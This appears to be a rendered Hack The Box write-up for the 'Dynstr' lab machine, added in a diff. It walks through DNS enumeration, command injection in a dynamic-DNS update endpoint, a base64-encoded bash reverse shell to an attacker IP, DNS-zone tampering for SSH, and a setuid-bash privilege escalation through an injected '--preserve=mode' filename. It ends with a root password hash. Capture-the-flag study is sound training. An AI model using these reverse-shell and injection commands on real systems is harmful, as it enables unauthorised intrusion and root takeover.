@@ -1,0 +1,126 @@
+I"H%<h1 id="main-points">Main points</h1>
+<ul>
+  <li>DNS query: <code class="language-plaintext highlighter-rouge">dig</code></li>
+  <li>DNS <a href="https://www.cloudflare.com/learning/dns/dns-records/">Overview</a></li>
+  <li>encode a payload in base64 and pipe to bash for RCE</li>
+  <li>SSH can restrict access from a specific DNS zone <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code></li>
+  <li><code class="language-plaintext highlighter-rouge">command *</code>  can be injected for command or parameter with filename</li>
+  <li><code class="language-plaintext highlighter-rouge">chmod +s</code> to set setuid bit to file, it can be elevated to owner/group</li>
+  <li><code class="language-plaintext highlighter-rouge">bash -p</code> to run bash privileged</li>
+</ul>
+
+<h1 id="writeup">Writeup</h1>
+<h2 id="enumeration">Enumeration</h2>
+<p>We start with nmap as usual</p>
+<ul>
+  <li>22/tcp open  ssh     syn-ack OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)</li>
+  <li>53/tcp open  domain  syn-ack ISC BIND 9.16.1 (Ubuntu Linux)</li>
+  <li>80/tcp open  http    syn-ack Apache httpd 2.4.41 ((Ubuntu))</li>
+</ul>
+
+<p>Let’s first start with the DNS port and query the server with a reverse lookup query with  <code class="language-plaintext highlighter-rouge">dig</code>
+<code class="language-plaintext highlighter-rouge">dig @10.10.10.244 -x 10.10.10.244</code>
+We get this
+<img src="/assets/Pasted%20image%2020210720013314.png" alt="Pasted image 20210720013314.png" />
+So we discover these 2 hosts
+<code class="language-plaintext highlighter-rouge">dns1.dyna.htb</code> and <code class="language-plaintext highlighter-rouge">hostmaster.dyna.htb</code></p>
+
+<p>let’s add them to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file and check the port 80
+we go to <code class="language-plaintext highlighter-rouge">http://10.10.10.244/</code>
+<img src="/assets/Pasted%20image%2020210720013627.png" alt="Pasted image 20210720013627.png" /></p>
+
+<p>So this is a DNS service, we scroll further down</p>
+
+<p><img src="/assets/Pasted%20image%2020210720013650.png" alt="Pasted image 20210720013650.png" />
+Interesting, let’s save these creds for beta mode, we see there are other domains, let’s add them to our <code class="language-plaintext highlighter-rouge">/etc/hosts</code></p>
+
+<p>We see on the left it says they provide the same API as no-ip.com, so let’s check <a href="https://www.noip.com/integrate/request">no-ip.com’s  API</a></p>
+
+<p>We see there is an endpoint <code class="language-plaintext highlighter-rouge">/nic/update</code> to send an update, let’s use our creds found in beta mode to <code class="language-plaintext highlighter-rouge">no-ip.htb</code>
+Let’s fire up Burp Suite and catch the request to <code class="language-plaintext highlighter-rouge">http://no-ip.htb/nic/update</code> and change the <code class="language-plaintext highlighter-rouge">Authorization</code> header, as seen in the API documentation of <code class="language-plaintext highlighter-rouge">no-ip.com</code> to base64 of <code class="language-plaintext highlighter-rouge">username:password</code>
+<img src="/assets/Pasted%20image%2020210720181925.png" alt="Pasted image 20210720181925.png" />
+We get
+<img src="/assets/Pasted%20image%2020210720191556.png" alt="Pasted image 20210720191556.png" />
+Hmm, let’s play a little with the hostname then
+This one <code class="language-plaintext highlighter-rouge">dyna.dynamicdns.htb</code> worked
+<img src="/assets/Pasted%20image%2020210720191841.png" alt="Pasted image 20210720191841.png" /></p>
+
+<p>When we add <code class="language-plaintext highlighter-rouge">'</code>  to hostname we get
+<img src="/assets/Pasted%20image%2020210720192030.png" alt="Pasted image 20210720192030.png" /></p>
+
+<p>So it’s probably using <code class="language-plaintext highlighter-rouge">nsupdate</code> like this
+<code class="language-plaintext highlighter-rouge">nsupdate "$IP"</code>, maybe we can do command injection
+We can see
+<img src="/assets/Pasted%20image%2020210720192650.png" alt="Pasted image 20210720192650.png" /></p>
+
+<h2 id="foothold">Foothold</h2>
+
+<p>We have code injection. BUt we can’t inject directly our reverse shell</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/bin/bash <span class="nt">-l</span> <span class="o">&gt;</span> /dev/tcp/10.10.14.127/4444 0&lt;&amp;1 2&gt;&amp;1
+</code></pre></div></div>
+<p>We can encode id in base64, and make the injection decode it and pipe it to bash
+Our base64 reverse shell</p>
+<pre><code class="language-base64">YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjcvNDQ0NCAwPiYxIC1uCg==
+</code></pre>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>L2Jpbi9iYXNoIC1sID4gL2Rldi90Y3AvMTAuMTAuMTQuMTI3LzQ0NDQgMDwmMSAyPiYxCg==
+</code></pre></div></div>
+<p>We trigger the RCE with</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">echo</span> <span class="o">[</span><span class="nb">base64 </span>encoded payload] | <span class="nb">base64</span> <span class="nt">-d</span> | bash
+</code></pre></div></div>
+<p><img src="/assets/Pasted%20image%2020210720200112.png" alt="Pasted image 20210720200112.png" />
+And we have a shell
+<img src="/assets/Pasted%20image%2020210720200203.png" alt="Pasted image 20210720200203.png" /></p>
+
+<p>When we see the <code class="language-plaintext highlighter-rouge">/etc/passwd</code> file we see there are 2 users
+<code class="language-plaintext highlighter-rouge">dyna</code> and <code class="language-plaintext highlighter-rouge">bindmgr</code>
+<img src="/assets/Pasted%20image%2020210720200320.png" alt="Pasted image 20210720200320.png" /></p>
+
+<p>We see in <code class="language-plaintext highlighter-rouge">dyna</code> home directory
+<img src="/assets/Pasted%20image%2020210720201117.png" alt="Pasted image 20210720201117.png" />
+So we will probably use dyna to get root</p>
+
+<p>We see in <code class="language-plaintext highlighter-rouge">bindmgr</code> there is a strace file, we see there is a private SSH key but we can’t connect with it, because it only accepts hosts from <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb*</code></p>
+
+<h2 id="user">User</h2>
+
+<p>in <code class="language-plaintext highlighter-rouge">.ssh/authorized_keys</code>
+<img src="/assets/Pasted%20image%2020210720213940.png" alt="Pasted image 20210720213940.png" />
+We see that our IP isn’t in the DNS zone (must read more about that didnt understand everything)
+So we should update the DNS zone of <code class="language-plaintext highlighter-rouge">*.infra.dyna.htb</code> with <code class="language-plaintext highlighter-rouge">nsupdate</code> with our IP, (seen in strace), we see there are keys in <code class="language-plaintext highlighter-rouge">/etc/bind</code></p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nsupdate -k infra.key
+update add pico.infra.dyna.htb 86400 A 10.10.14.127
+update add 127.14.10.10.in-addr.arpa 300 PTR pico.infra.dyna.htb
+send
+</code></pre></div></div>
+
+<p>^7d4463</p>
+
+<p>And se try to ssh again and it works
+<img src="/assets/Pasted%20image%2020210720215737.png" alt="Pasted image 20210720215737.png" />
+And we have user flag, let’s try to get root.</p>
+
+<h1 id="priv-esc">Priv Esc</h1>
+
+<p>We run <code class="language-plaintext highlighter-rouge">sudo -l</code> and we see
+<img src="/assets/Pasted%20image%2020210720215922.png" alt="Pasted image 20210720215922.png" /></p>
+
+<p>Let’s check the content of this file
+<img src="/assets/bindmgr.sh" alt="bindmgr.sh" /></p>
+
+<p>So this script checks if there is a file named <code class="language-plaintext highlighter-rouge">.version</code> in the current directory where it is ran and if it’s different than the one in /etc/bind/named/bindmgr, if not, it exits.</p>
+
+<p>Then it copies everything with the command <code class="language-plaintext highlighter-rouge">cp .version *</code> to <code class="language-plaintext highlighter-rouge">/etc/bind/named.bindmgr</code></p>
+
+<p>And all the files copied are owned by root, so the idea is we copy the bash binary to /tmp where we have write access, add a setuid bit to be able to elevate to the owner (which will be root), and to preserve the <code class="language-plaintext highlighter-rouge">s</code> mode, we can inject the parameter <code class="language-plaintext highlighter-rouge">--preserve=mode</code> since the command to copy is <code class="language-plaintext highlighter-rouge">cp *</code> and not <code class="language-plaintext highlighter-rouge">cp ./*</code> and run <code class="language-plaintext highlighter-rouge">bash -p</code> to run as privileged user</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nb">cp</span> /bin/bash <span class="nb">.</span>
+<span class="nb">chmod</span> +s bash
+<span class="nb">echo</span> <span class="s2">""</span> <span class="o">&gt;</span> <span class="s2">"--preserve=mode"</span>
+<span class="nb">sudo</span> /usr/local/bin/bindmgr.sh
+/etc/bind/named.bindmgr/bash <span class="nt">-p</span>
+</code></pre></div></div>
+<p>And we have root</p>
+<h1 id="root-hash">Root hash</h1>
+<p><code class="language-plaintext highlighter-rouge">$6$knCJjR0E8SuLyI5.$r7dGtVVY/Z6X0RQKxUvBZY4BQ3DwL7kHtu5YO9cclorPryKq489j2JqN262Ows/aRZvFkQ1R9uQyqoVWeS8ED1</code></p>
+:ET
